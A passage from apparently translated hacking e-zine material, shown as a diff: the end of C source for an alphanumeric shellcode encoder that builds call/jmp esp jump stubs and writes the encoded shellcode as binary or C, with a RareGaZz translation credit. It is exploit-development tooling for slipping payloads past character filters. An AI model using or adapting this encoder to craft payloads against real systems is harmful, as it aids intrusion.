+ case OUTPUT_MODE_STACK:
+  alphanumeric_stack_generate(output,input);
+
+  if (stack_mode!=STACK_MODE_NULL) { /* si la construccion de salto es necesitada */
+   stack=shellcode_malloc();
+   if (debug_jump) INT3(stack);
+   switch(stack_mode) {
+   case STACK_MODE_CALL:
+    CALL_ESP(stack);  /* call esp */
+    break;
+   case STACK_MODE_JMP:
+    JMP_ESP(stack);   /* jmp esp */
+    break;
+   case STACK_MODE_RET:
+    PUSHr(stack,ESP); /* push esp */
+    RET(stack);       /* ret */
+    break;
+   }
+   if (debug_build_jump) INT3(output);
+   alphanumeric_patches_generate(output,stack);
+   shellcode_free(stack);
+  }
+  else { /* no es necesitada la construccion de salto */
+   if (debug_jump) INT3(output);
+  }
+  break;
+
+ case OUTPUT_MODE_PATCHES:
+  alphanumeric_patches_generate(output,input);
+  break;
+ }
+
+
+ /* imprimir el shellcode en pantalla */
+ fprintf(stderr,"Shellcode (%d bytes):\n",output->size);
+ shellcode_print(output);
+ fclose(stdout);
+ fprintf(stderr,"\n");
+
+ /* escribir archivo input */
+ if (output_filename) {
+  fprintf(stderr,"Writing %s ...\n",output_filename);
+
+  switch(output_format) {
+  case OUTPUT_FORMAT_BIN:
+   ret=shellcode_write_binary(output,output_filename);
+   break;
+  case OUTPUT_FORMAT_C:
+   ret=shellcode_write_C(output,output_filename);
+   break;
+  }
+  if (ret==-1) {
+   shellcode_free(input);
+   shellcode_free(output);
+   print_error();
+  }
+ }
+
+ shellcode_free(input);
+ shellcode_free(output);
+ fprintf(stderr,"Done.\n");
+}
+
+/******************************************************************************/
+<-->
+
+|EOF|--------------------------------------------------------------------|
+
+
+ Traducido por Active Matrix - ActiveMatrix@technologist.com
+ Para RareGaZz - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
+
+
